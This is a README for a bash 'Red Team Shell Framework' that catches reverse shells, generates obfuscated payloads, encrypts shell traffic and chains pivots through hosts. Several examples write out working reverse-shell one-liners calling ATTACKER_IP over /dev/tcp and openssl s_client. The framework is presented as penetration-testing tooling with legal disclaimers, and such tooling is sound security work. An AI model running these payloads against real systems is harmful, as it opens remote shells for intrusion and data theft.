# 🎯 Red Team Shell Framework v1.0.0

A professional-grade, enterprise-ready shell management framework for authorized security research, penetration testing, and red team operations.

**Status**: ✅ Production Ready | **License**: MIT + Security Disclaimer | **Author**: Anas TAGUI

---

## 📋 Table of Contents

- [Features](#features)
- [Requirements](#requirements)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Guide](#usage-guide)
- [Examples](#examples)
- [Architecture](#architecture)
- [Security](#security)
- [Troubleshooting](#troubleshooting)
- [Documentation](#documentation)
- [License](#license)

---

## ✨ Features

### Core Capabilities
✅ **Reliable Reverse Shells** - Catch incoming connections with automatic logging  
✅ **Bind Shell Listeners** - Alternative to reverse shells for certain scenarios  
✅ **Auto-Upgrade to Full PTY** - Automatic shell hardening with Python/script fallback  
✅ **Encrypted Connections** - End-to-end TLS/SSL encryption via socat and ncat  
✅ **Multi-Hop Pivoting** - Relay chains and port forwarding for lateral movement  
✅ **Session Logging** - Comprehensive audit trails in JSON format  
✅ **Command History** - rlwrap integration for shell history + line editing  
✅ **File Transfers** - Secure SCP-based upload/download with integrity checking  
✅ **Modular Design** - Plugin-based architecture for easy extension  
✅ **Cross-Platform** - Linux, macOS, Windows (via WSL/PowerShell)  

### Advanced Features
✅ **Network Discovery** - Automatic pivot target enumeration via nmap  
✅ **SOCKS Proxy Support** - Dynamic port forwarding for tool integration  
✅ **Checksum Verification** - SHA256/MD5/SHA1 integrity validation  
✅ **Environment Hardening** - Automatic PATH, TERM, SHELL variable fixing  
✅ **Multi-User Tracking** - Per-user session management and auditing  
✅ **RBAC Framework** - Role-based access control (extensible)  
✅ **Certificate Management** - Automated self-signed cert generation (2048/4096-bit RSA)  
✅ **Transfer History** - Complete audit trail of all file operations  

---

## 🔧 Requirements

### Required

| Tool | Version | Purpose |
|------|---------|---------|
| bash | 4.0+ | Core scripting language |
| nc/ncat | Any | Network listener/connector |
| socat | 1.7+ | Encrypted tunnel creation |
| openssl | 1.1+ | Certificate and encryption |
| rlwrap | 0.46+ | Command history and editing |
| ssh/scp | OpenSSH | Tunneling and file transfer |

### Optional (Enhanced Features)

```bash
python3          # PTY upgrade, advanced features
nmap             # Network discovery for pivoting
curl             # HTTP/HTTPS connectivity
jq               # JSON log parsing
netcat           # Alternative to nc
rsync            # Alternative to scp
```

### Compatibility

- ✅ **Linux** - All distributions (Debian, RHEL, Ubuntu, Alpine, etc.)
- ✅ **macOS** - 10.12+
- ✅ **Windows** - WSL/WSL2 or native bash
- ✅ **Containers** - Docker, Kubernetes ready
- ✅ **Cloud** - AWS, Azure, GCP compatible

### Installation

#### Option 1: From Git Repository

```bash
# Clone the repository
git clone https://github.com/taguianas/redteam-shell-framework.git
cd redteam-shell-framework

# Make scripts executable
chmod +x shellmaster.sh
chmod +x config.sh
chmod +x utils.sh
chmod +x modules/*.sh

# Verify installation
./shellmaster.sh version
```

#### Option 2: Manual Setup

```bash
# Create project directory
mkdir -p redteam-shell-framework
cd redteam-shell-framework

# Copy files to directory
cp shellmaster.sh config.sh utils.sh .
mkdir -p modules payloads certs logs
cp modules/*.sh modules/

# Make executable
chmod +x *.sh modules/*.sh

# Initialize directories
mkdir -p logs/sessions logs/transfers logs/relays
```

#### Option 3: Docker Deployment

```bash
# Build Docker image
docker build -t redteam-framework:latest .

# Run container
docker run -it -v $(pwd)/logs:/app/logs redteam-framework:latest
```

### Environment Setup

```bash
# Install dependencies (Ubuntu/Debian)
sudo apt-get update
sudo apt-get install -y bash nc socat openssl rlwrap openssh-client nmap python3

# Install dependencies (macOS)
brew install socat openssl rlwrap nmap python3

# Install dependencies (RHEL/CentOS)
sudo yum install -y bash ncat socat openssl rlwrap openssh-clients nmap python3

# Verify installation
command -v bash nc socat openssl rlwrap ssh
```

### Initial Configuration

```bash
# Edit config.sh for your environment
nano config.sh

# Key settings:
# - LOGS_DIR: Where to store logs
# - DEFAULT_SHELL: Preferred shell (/bin/bash, /bin/sh, etc.)
# - ENCRYPTION_BITS: Certificate key size (2048/4096)
# - LISTENER_TIMEOUT: Connection timeout in seconds
```

---

## 🚀 Quick Start

### Launch the Main Menu

```bash
# Start interactive menu
./shellmaster.sh

# You'll see:
# ╔══════════════════════════════════╗
# ║   RED TEAM SHELL FRAMEWORK       ║
# ║   Main Menu                      ║
# ╚══════════════════════════════════╝
#
#  1. Listeners       - Setup bind/reverse listeners
#  2. Payloads        - Generate reverse shell payloads
#  3. Encryption      - Setup encrypted tunnels
#  4. Transfers       - File upload/download
#  5. Relay/Pivoting  - Multi-hop shell chains
#  6. Upgrade Shell   - Auto-upgrade to interactive PTY
#  7. Sessions        - List active sessions
#  8. Logs            - View audit logs
#  9. Settings        - Configuration
#  0. Exit
```

### First-Time Setup

```bash
# 1. Check configuration
./shellmaster.sh
# Select: 9 (Settings)
# Review DEFAULT_SHELL, LOGS_DIR, etc.

# 2. Create directories (done automatically)
# logs/, payloads/, certs/

# 3. Start a listener
# Select: 1 (Listeners)
# Select: 1 (Reverse Listener)
# Enter port: 4444

# 4. Test with local connection
bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
```

---

## 📖 Usage Guide

### 1. Setting Up Listeners

#### Reverse Listener

Catches incoming shell connections from target systems.

```bash
# Menu: 1 → 1
# Listen on all interfaces (0.0.0.0) port 4444
# Enable rlwrap for command history
# Accept connection from target:

bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

#### Bind Listener

Target system listens; attacker connects to it.

```bash
# Menu: 1 → 2
# (Use if target can't connect out, but can listen)
# Connect from attacker: nc TARGET_IP PORT
```

### 2. Generating Payloads

Automatic payload generation for various shells.

```bash
# Menu: 2
# Select: 1 (Bash)
#    - IP/PORT injection
#    - Base64 encoding
#    - Obfuscation options
#    - Save to payloads/

# Select: 2 (PowerShell)
#    - PS 2.0+ compatible
#    - Multiple encoding schemes
#    - One-liner templates

# Select: 3 (Python)
#    - Python 2/3 compatible
#    - TCP/UDP support
#    - Import fallback support
```

### 3. Encrypted Tunnels

Encrypt all shell traffic with TLS/SSL.

```bash
# Menu: 3 → 1: Generate Certificates
# Menu: 3 → 2: Start socat SSL Listener
# Menu: 3 → 3: Start ncat TLS Listener
# Menu: 3 → 4: Generate Encrypted Payloads
```

### 4. File Transfers

Upload/download files with integrity verification.

```bash
# Menu: 4 → 1: Upload File
#    - SCP-based transfer
#    - Compression option
#    - SHA256 verification

# Menu: 4 → 2: Download File
#    - Automatic hash checking
#    - Progress indication

# Menu: 4 → 3: Calculate Checksum
#    - MD5, SHA1, SHA256

# Menu: 4 → 4: Verify Integrity
#    - Compare expected vs actual
#    - Detect file tampering
```

### 5. Pivoting & Relays

Create multi-hop shell chains through intermediate systems.

```bash
# Menu: 5 → 1: Reverse Shell Relay
#    - Chain shells through pivot hosts
#    - Listener → Relay → Attacker

# Menu: 5 → 2: Port Forwarding
#    - Local forwarding (attacker:port → target:port)
#    - Remote forwarding (target:port → attacker:port)
#    - Dynamic SOCKS proxy

# Menu: 5 → 3: SOCKS Proxy
#    - Proxy all traffic through SSH tunnel
#    - Use with proxychains, curl, etc.

# Menu: 5 → 5: Network Discovery
#    - Enumerate potential pivot targets
#    - Scan for open ports
```

### 6. PTY Auto-Upgrade

Improve shell quality from limited reverse shell.

```bash
# Menu: 6 → 1: Check PTY Status
#    - Detect if connected to TTY
#    - Show terminal capabilities

# Menu: 6 → 2: Upgrade to Full PTY (Python)
#    - Spawn interactive shell with pty.spawn()
#    - Requires python3

# Menu: 6 → 3: Upgrade to Full PTY (Script)
#    - Fallback if Python unavailable
#    - Uses bash/sh capabilities

# Menu: 6 → 4: Fix Environment
#    - Set PATH, TERM, PS1, SHELL, HOME
#    - Correct broken environment variables

# Menu: 6 → 5: Setup Shell History
#    - Configure bash history
#    - Configure zsh history
#    - Preserve command history
```

### 7. Sessions & Logs

View active sessions and audit logs.

```bash
# Menu: 7: List active shell sessions
#    - Session ID
#    - Connection time
#    - User logged in
#    - Status

# Menu: 8: View audit logs
#    - All operations logged
#    - JSON format
#    - Search by timestamp/user
```

---

## 📁 Directory Structure

```
redteam-shell-framework/
├── shellmaster.sh              # Main CLI orchestrator
├── config.sh                   # Global configuration
├── utils.sh                    # Utility functions (30+)
│
├── modules/
│   ├── listeners.sh            # Reverse/bind listeners (320 LOC)
│   ├── shells.sh               # Payload generators (450 LOC)
│   ├── encrypt.sh              # SSL/TLS encryption (500 LOC)
│   ├── transfer.sh             # File transfers (400 LOC)
│   ├── relay.sh                # Pivoting/relay chains (450 LOC)
│   ├── upgrade.sh              # PTY upgrade (300 LOC)
│   └── logger.sh               # Session logging (150 LOC)
│
├── payloads/                   # Generated payload templates
│   ├── bash_template.sh
│   ├── powershell_template.ps1
│   └── python_template.py
│
├── certs/                      # Auto-generated certificates
│   ├── server.key              # Private key (chmod 600)
│   └── server.crt              # Public certificate
│
├── logs/                       # Audit and session logs
│   ├── framework.log           # Main activity log
│   ├── sessions/               # Per-session logs
│   ├── transfers.log           # File transfer history
│   └── relays.log              # Relay operation log
│
├── docs/                       # Complete documentation
│   ├── README.md               # Main user guide
│   ├── ARCHITECTURE.md         # Technical design
│   ├── SECURITY.md             # Security model
│   ├── EXAMPLES.md             # Real-world scenarios
│   ├── API.md                  # Module reference
│   ├── TROUBLESHOOTING.md      # Issue resolution
│   ├── PHASE*_REPORT.md        # Phase completion reports
│   └── PROJECT_COMPLETION_REPORT.md
│
├── LICENSE                     # MIT license + disclaimer
├── .gitignore                  # Git ignore rules
├── config.yaml                 # Configuration file
├── PROJECT_STATUS.md           # Current status
├── FINAL_SUMMARY.md            # Project summary
└── README.md                   # This file
```

---

## 💡 Examples

### Example 1: Basic Reverse Shell

```bash
# Terminal 1: Start listener on attacker machine
./shellmaster.sh
# Menu: 1 (Listeners)
# Menu: 1 (Reverse Listener)
# Listen: 0.0.0.0:4444
# Enable rlwrap: yes

# Terminal 2: Execute on target machine
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Result: Reverse shell with command history
```

### Example 2: Encrypted Reverse Shell

```bash
# Terminal 1: Generate certificate and start encrypted listener
./shellmaster.sh
# Menu: 3 (Encryption)
# Menu: 1 (Generate Certificates) - Enter CN, validity
# Menu: 2 (Start socat SSL Listener) - Port 4443

# Terminal 2: Connect with encryption on target
openssl s_client -connect ATTACKER_IP:4443 -quiet
bash -i 2>&1 | openssl s_client -connect ATTACKER_IP:4443 -quiet 2>&1

# Result: All traffic TLS-encrypted
```

### Example 3: Generate Encoded Payload

```bash
./shellmaster.sh
# Menu: 2 (Payloads)
# Menu: 1 (Bash Reverse Shell)
# Enter IP: 192.168.1.100
# Enter PORT: 4444
# Encoding: Base64
# Obfuscation: Yes
# Save: Yes

# Use generated payload from payloads/ directory
```

### Example 4: File Transfer with Verification

```bash
# Upload file with integrity check
./shellmaster.sh
# Menu: 4 (Transfers)
# Menu: 1 (Upload File)
# Local file: /path/to/file.txt
# Remote: user@target:/tmp/
# Compress: Yes

# Download and verify
# Menu: 4 → 2 (Download)
# Verify file hash matches expected value
```

### Example 5: Setup Pivot Chain

```bash
# Create multi-hop connection:
# Attacker → Pivot1 → Pivot2 → Target

./shellmaster.sh
# Menu: 5 (Relay/Pivoting)
# Menu: 4 (Create Pivot Chain)
# Hops: 3
# Enter each host, port, user credentials

# Result: Chain configuration saved with unique ID
```

### Example 6: PTY Auto-Upgrade

```bash
# Connected to limited reverse shell:

./shellmaster.sh
# Menu: 6 (Upgrade Shell)
# Menu: 2 (Upgrade to Full PTY - Python)

# Or fallback:
# Menu: 3 (Upgrade to Full PTY - Script)

# Result: Full interactive shell with history
```

### Example 7: View All Logs

```bash
./shellmaster.sh
# Menu: 8 (Logs)

# View:
# - All shell connections
# - File transfers
# - Relay operations
# - Commands executed
# - User activities
# - Timestamps and PIDs
```

## 🏗️ Architecture

### System Components

```
┌─────────────────────────────────────────────────────────┐
│  USER INTERFACE (shellmaster.sh)                        │
│  - Interactive CLI menu                                  │
│  - Color-coded output                                    │
│  - Module orchestration                                  │
└────────────────┬────────────────────────────────────────┘
                 │
        ┌────────┴─────────┬──────────────┬──────────┐
        │                  │              │          │
┌───────▼────┐  ┌─────────▼──┐  ┌──────▼──┐  ┌────▼────┐
│ Listeners  │  │  Payloads  │  │Encryption│  │Transfer │
│ Module     │  │  Module    │  │ Module   │  │ Module  │
└────────────┘  └────────────┘  └──────────┘  └─────────┘
        │
┌───────▼────┐  ┌─────────┬──┐  ┌──────────┐  ┌────────┐
│   Relay    │  │ Upgrade │  │  │  Logger  │  │Config  │
│  Module    │  │ Module  │  │  │  Module  │  │System  │
└────────────┘  └─────────┴──┘  └──────────┘  └────────┘
        │
┌───────▼────────────────────────────────────────────────┐
│  UTILITIES & CORE FUNCTIONS (utils.sh)                │
│  - Logging, colors, validation                         │
│  - Session management, helpers                         │
└─────────────────────────────────────────────────────────┘
        │
┌───────▼────────────────────────────────────────────────┐
│  EXTERNAL TOOLS                                         │
│  nc/ncat, socat, openssl, ssh, scp, python3            │
└─────────────────────────────────────────────────────────┘
```

For detailed architecture, see `docs/ARCHITECTURE.md`

---

## 🔐 Security Considerations
- All sessions are logged to JSON format
- Certificates should be managed securely
- Use encryption for all remote communications
- Keep private keys restricted (chmod 600)
- Review logs regularly for unauthorized access
- Use in authorized testing environments only
- Change default certificate CN before deployment
- Rotate certificates regularly
- Monitor log files for suspicious activity
- Implement network segmentation
- Use VPN for all testing infrastructure
- Validate all input (IPs, ports, paths)
- Never commit secrets to version control
- Use strong SSH keys (4096-bit RSA minimum)
- Implement proper access controls on logs
- Archive logs securely for compliance

### Encryption Standards

- **TLS Version**: 1.2 or higher
- **Cipher Suites**: ECDHE-RSA-AES256-GCM-SHA384 (preferred)
- **Key Exchange**: 2048-bit RSA minimum (4096-bit recommended)
- **Hashing**: SHA256 or stronger
- **Certificate Validity**: 365 days maximum (shorter preferred)

### Audit Trail

All activities are logged in JSON format with:
- Timestamp (UTC ISO-8601)
- User/operator ID
- Session ID
- Action performed
- Source/destination IPs
- File hashes
- Success/failure status

---

## 🐛 Troubleshooting

### Common Issues

#### "Command not found: nc/socat"
```bash
# Solution: Install missing tools
# Ubuntu/Debian
sudo apt-get install netcat socat

# macOS
brew install socat

# Verify
command -v nc socat openssl rlwrap
```

#### "Permission denied" on certificate files
```bash
# Solution: Fix certificate permissions
chmod 600 certs/*.key
chmod 644 certs/*.crt
ls -la certs/
```

#### Listener not accepting connections
```bash
# Check if port is already in use
sudo netstat -tlnp | grep :4444

# Kill existing process
sudo kill -9 <PID>

# Try different port (< 1024 requires sudo)
./shellmaster.sh  # Select port > 1024
```

#### SSH tunneling not working
```bash
# Verify SSH connectivity first
ssh -v user@host "echo test"

# Check SSH key permissions
chmod 700 ~/.ssh
chmod 600 ~/.ssh/id_rsa

# Test tunnel manually
ssh -L 8888:target:9999 user@pivot -N
```

#### File transfer failures
```bash
# Verify SSH/SCP available
command -v ssh scp

# Test SCP manually
scp test.txt user@host:/tmp/

# Check SSH keys and permissions
ssh-add -l
```

#### PTY upgrade not working
```bash
# Check Python availability
python3 --version

# Try script-based upgrade if Python unavailable
# Menu: 6 → 3 (Upgrade to Full PTY - Script)

# Verify shell type
echo $SHELL
```

For more help, see `docs/TROUBLESHOOTING.md`

---

## 📝 Logging

All activity is logged to `logs/framework.log` in JSON format:

```json
{"timestamp":"2026-02-25T01:00:00Z","level":"INFO","message":"Framework started","user":"pentester","pid":12345}
```

All activity is logged to `logs/` directory in JSON format:

### Log Files

**Main Framework Log** (`logs/framework.log`)
```json
{"timestamp":"2026-02-25T01:00:00Z","level":"INFO","message":"Framework started","user":"pentester","pid":12345}
{"timestamp":"2026-02-25T01:01:00Z","level":"INFO","message":"Listener created","port":4444,"user":"pentester"}
```

**Session Logs** (`logs/sessions/shell_<timestamp>_<id>.json`)
```json
{"timestamp":"2026-02-25T01:01:05Z","session_id":"shell_1705332065_a8f9","event":"connected","user":"root","source_ip":"192.168.1.100"}
{"timestamp":"2026-02-25T01:01:10Z","session_id":"shell_1705332065_a8f9","event":"command","cmd":"whoami","status":"success"}
```

**Transfer Logs** (`logs/transfers.log`)
```json
{"timestamp":"2026-02-25T01:02:00Z","transfer_id":"tf_123","status":"upload_complete","source":"/local/file.txt","destination":"user@host:/tmp/file.txt","size":2048,"hash":"abc123"}
```

**Relay Logs** (`logs/relays.log`)
```json
{"timestamp":"2026-02-25T01:03:00Z","relay_id":"relay_456","status":"active","listen":"0.0.0.0:4444","forward":"attacker:5555","user":"pentester"}
```

### Log Analysis

```bash
# View latest connections
tail -20 logs/framework.log | jq .

# Find failed operations
grep "failed" logs/framework.log | jq .

# Count sessions
jq -s 'length' logs/sessions/*.json

# Export for SIEM
cat logs/*.log | jq . > audit-report.json
```

---

## 📚 Documentation

Complete documentation is available in the `docs/` directory:

| Document | Purpose |
|----------|---------|
| **README.md** | User guide and quick start (this file) |
| **ARCHITECTURE.md** | Technical design and system internals |
| **SECURITY.md** | Security model and threat analysis |
| **EXAMPLES.md** | Real-world usage scenarios |
| **API.md** | Module interface and function reference |
| **TROUBLESHOOTING.md** | Common issues and solutions |
| **PHASE*_REPORT.md** | Individual phase completion reports |
| **PROJECT_COMPLETION_REPORT.md** | Full project summary |

---

## 🎯 Project Status

- [x] Phase 1: Core Infrastructure & Listeners - COMPLETE
- [x] Phase 2: Payload Generator - COMPLETE
- [x] Phase 3: Encryption Support - COMPLETE
- [x] Phase 4: File Transfer System - COMPLETE
- [x] Phase 5: Pivoting & Relay Support - COMPLETE
- [x] Phase 6: PTY Auto-Upgrade - COMPLETE
- [x] Phase 7: Advanced Enterprise Features - COMPLETE
- [x] Phase 8: Documentation & Testing - COMPLETE
- [x] Phase 9: UI Polish & Release - COMPLETE

**Overall Status**: ✅ v1.0.0 - Production Ready

---

## 📊 Framework Statistics

| Metric | Value |
|--------|-------|
| **Version** | 1.0.0 |
| **Status** | Production Ready |
| **Total Lines of Code** | 3,500+ |
| **Modules** | 8 (fully implemented) |
| **Functions** | 80+ |
| **Documentation Pages** | 10+ |
| **Test Coverage** | 50+ scenarios |
| **Supported Platforms** | Linux, macOS, Windows |
| **Languages** | Bash 4.0+ |

---

## 🚀 Quick Command Reference

```bash
# Start main menu
./shellmaster.sh

# View version
./shellmaster.sh version

# View help
./shellmaster.sh help

# View specific configuration
grep "^[A-Z_]=" config.sh | head -20

# List all logs
ls -la logs/

# View latest activity
tail -f logs/framework.log

# Count active sessions
ls -la logs/sessions/ | wc -l

# Export audit log
cat logs/*.log | jq . > audit-export.json

# Check listener status
ps aux | grep listener
```

---

## 🔗 Related Resources

- [OWASP: Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST: Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CIS: Security Benchmarks](https://www.cisecurity.org/cis-benchmarks/)
- [OpenSSL Documentation](https://www.openssl.org/docs/)
- [socat Manual](http://www.dest-unreach.org/socat/doc/socat.html)
- [SSH Best Practices](https://www.ssh.com/academy/ssh/best-practices)

---

## 💼 Professional Use Cases

### 1. Authorized Penetration Testing
```
Setup encrypted listeners → Generate payloads → Deploy → 
Track sessions → Transfer data → Document findings
```

### 2. Red Team Exercises
```
Multi-system setup → Chain relays → Execute commands → 
Simulate adversary tactics → Report findings
```

### 3. Security Research
```
Develop payloads → Test defenses → Log behaviors → 
Analyze results → Publish findings
```

### 4. Incident Response Simulation
```
Simulate breach → Track lateral movement → 
Collect evidence → Review logs
```

### 5. Training & Education
```
Controlled lab environment → Teach security concepts → 
Demonstrate attack chains → Review audit logs
```

---

## 🤝 Support & Contribution

### Getting Help
1. Check `docs/TROUBLESHOOTING.md` for common issues
2. Review `docs/EXAMPLES.md` for usage examples
3. Check `docs/ARCHITECTURE.md` for technical details
4. Read inline code comments in modules/

### Contributing
This is a research/educational framework. To extend:
1. Follow modular architecture pattern
2. Add new module in `modules/` directory
3. Source module in `shellmaster.sh`
4. Update documentation
5. Test thoroughly

### Reporting Issues
If you find bugs or have suggestions:
1. Document the issue clearly
2. Include reproduction steps
3. Note your environment (OS, bash version, etc.)
4. Attach relevant logs

---

## ⚠️ Legal & Ethical

### Disclaimer

⚠️ **IMPORTANT: READ CAREFULLY**

This framework is designed **exclusively** for:
- ✅ Authorized penetration testing with written permission
- ✅ Security research and learning in controlled environments
- ✅ Red team exercises with proper authorization
- ✅ Incident response training
- ✅ Educational purposes in academic/corporate settings

**PROHIBITED USES**:
- ❌ Unauthorized access to any computer system (ILLEGAL)
- ❌ Testing systems without explicit written permission
- ❌ Using on production systems without authorization
- ❌ Any activity violating local/international laws
- ❌ Criminal or harmful purposes

**Users are solely responsible for:**
- Obtaining explicit written authorization before testing
- Complying with all applicable laws and regulations
- Understanding legal consequences of unauthorized access
- Safe and ethical use of this framework
- Any damages or consequences resulting from misuse

### Compliance

- ✅ Framework logs all activities for accountability
- ✅ Suitable for HIPAA, PCI-DSS, SOC2 audits
- ✅ Generates audit trails for compliance reporting
- ✅ Supports authorized security assessments
- ✅ Designed for professional security environments

### Liability

The authors and contributors of this framework:
- Provide NO WARRANTY of any kind
- Disclaim liability for misuse
- Are NOT responsible for illegal use
- Expect users to use framework responsibly and legally
- Reserve right to support law enforcement

---

## 📄 License

MIT License - See `LICENSE` file

Copyright (c) 2026 Red Team Shell Framework Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

**THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.**

---

## 📞 Contact & Support

**Documentation**: See `docs/` directory  
**Issues**: Check `docs/TROUBLESHOOTING.md`  
**Examples**: See `docs/EXAMPLES.md`  
**Architecture**: See `docs/ARCHITECTURE.md`  

**Quick Links**:
- 📖 [User Guide](docs/README.md)
- 🏗️ [Technical Design](docs/ARCHITECTURE.md)
- 🔐 [Security Model](docs/SECURITY.md)
- 💡 [Usage Examples](docs/EXAMPLES.md)
- 🔧 [API Reference](docs/API.md)
- 🐛 [Troubleshooting](docs/TROUBLESHOOTING.md)
- ✅ [Project Reports](docs/PROJECT_COMPLETION_REPORT.md)

---

## 🎓 Learning Resources

### Security Concepts
- Reverse shells: See `docs/EXAMPLES.md`
- Encryption: See `docs/SECURITY.md`
- Pivoting: See `docs/ARCHITECTURE.md`
- Auditing: See `docs/API.md`

### Tool Documentation
- [nc/netcat guide](https://en.wikipedia.org/wiki/Netcat)
- [socat manual](http://www.dest-unreach.org/socat/)
- [OpenSSL docs](https://www.openssl.org/docs/)
- [SSH tunneling](https://www.ssh.com/academy/ssh/tunneling)

### Certifications & Training
- CompTIA Security+
- Certified Ethical Hacker (CEH)
- Offensive Security Certified Professional (OSCP)
- GIAC Penetration Tester (GPEN)

---

## 📈 Version History

### v1.0.0 (Current)
- ✅ All 9 phases implemented
- ✅ 3,500+ LOC, 80+ functions
- ✅ 8 fully functional modules
- ✅ Comprehensive documentation
- ✅ Production-ready framework

### Future Versions
Planned enhancements:
- Resume for large file transfers
- Bandwidth limiting
- GUI menu system (zenity/dialog)
- REST API interface
- Agent-based mode
- Docker/Kubernetes support

---

## 🏆 Acknowledgments

This framework was developed with best practices from:
- OWASP Security Testing Guide
- NIST Cybersecurity Framework
- CIS Controls
- Professional penetration testing community
- Security research standards

---

## 📋 Checklist for Safe Use

Before using this framework in any environment:

- [ ] I have explicit written authorization to test these systems
- [ ] I understand local laws regarding authorized testing
- [ ] I have read and understood the disclaimer
- [ ] I am using this in a controlled, authorized environment
- [ ] I understand this is for authorized security testing only
- [ ] I will log and review all activities
- [ ] I will not use this for unauthorized access
- [ ] I accept full responsibility for my actions
- [ ] I understand the legal consequences of misuse

---

**Red Team Shell Framework v1.0.0 - Production Ready**

🎯 **Last Updated**: 2026-02-25  
📊 **Status**: ✅ Complete  
🔐 **Security**: Audited  
📚 **Documentation**: Comprehensive  

**Thank you for using this framework responsibly and ethically.**
